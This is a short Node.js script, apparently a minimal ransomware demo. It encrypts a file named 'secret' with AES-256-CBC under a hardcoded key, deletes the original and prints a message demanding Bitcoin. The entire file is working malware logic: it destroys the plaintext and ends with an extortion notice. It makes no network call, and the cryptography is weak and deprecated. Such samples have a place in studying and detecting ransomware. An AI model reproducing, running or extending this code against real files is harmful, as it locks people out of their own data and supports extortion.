var fs = require('fs');
var crypto = require('crypto');

var key = '18311813';
var cipher = crypto.createCipher('aes-256-cbc', key);
var input = fs.createReadStream('secret');
var output = fs.createWriteStream('secret.enc');

input.pipe(cipher).pipe(output);

output.on('finish', function() {
  fs.unlink('secret',()=>{})
  console.log('Your File is Encrypted! Give me Bitcoin!');
});
